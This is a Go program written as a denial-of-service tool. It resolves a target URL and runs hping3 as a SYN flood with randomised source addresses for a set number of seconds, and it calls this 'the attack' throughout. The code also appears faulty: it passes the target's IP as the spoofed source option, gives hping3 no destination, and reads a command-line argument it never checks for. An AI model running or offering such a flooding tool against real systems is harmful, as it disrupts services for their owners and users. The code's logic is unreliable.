package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func main() {
	// Check if a URL has been provided
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <url> <attack_duration_in_seconds>")
		os.Exit(1)
	}

	// Get the URL and attack duration from the command line arguments
	url := os.Args[1]
	attackDuration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Error converting attack duration to integer:", err)
		os.Exit(1)
	}

	// Start the attack
	startAttack(url, attackDuration)
}

func startAttack(url string, attackDuration int) {
	// Split the URL into host and port
	host, port := splitUrl(url)

	// Resolve the host
	addrs, err := net.LookupHost(host)
	if err != nil {
		fmt.Println("Error resolving host:", err)
		os.Exit(1)
	}

	// Get the IP address of the host
	ip := addrs[0]

	// Create a new command to send the SYN packets
	cmd := exec.Command("hping3", "-S", "-p", port, "-a", ip, "-i", "u1000", "--flood", "--rand-source", "--data", "1")

	// Start the command
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	if err != nil {
		fmt.Println("Error starting hping3:", err)
		os.Exit(1)
	}

	// Wait for the attack to finish
	time.Sleep(time.Second * time.Duration(attackDuration))

	// Stop the attack
	err = cmd.Process.Kill()
	if err != nil {
		fmt.Println("Error stopping hping3:", err)
		os.Exit(1)
	}
}

func splitUrl(url string) (string, string) {
	// Remove the protocol part of the URL
	url = strings.Replace(url, "http://", "", 1)
	url = strings.Replace(url, "https://", "", 1)

	// Split the URL into host and port
	parts := strings.Split(url, ":")
	if len(parts) == 1 {
		// If no port is specified, use port 80
		return parts[0], "80"
	} else {
		return parts[0], parts[1]
	}
}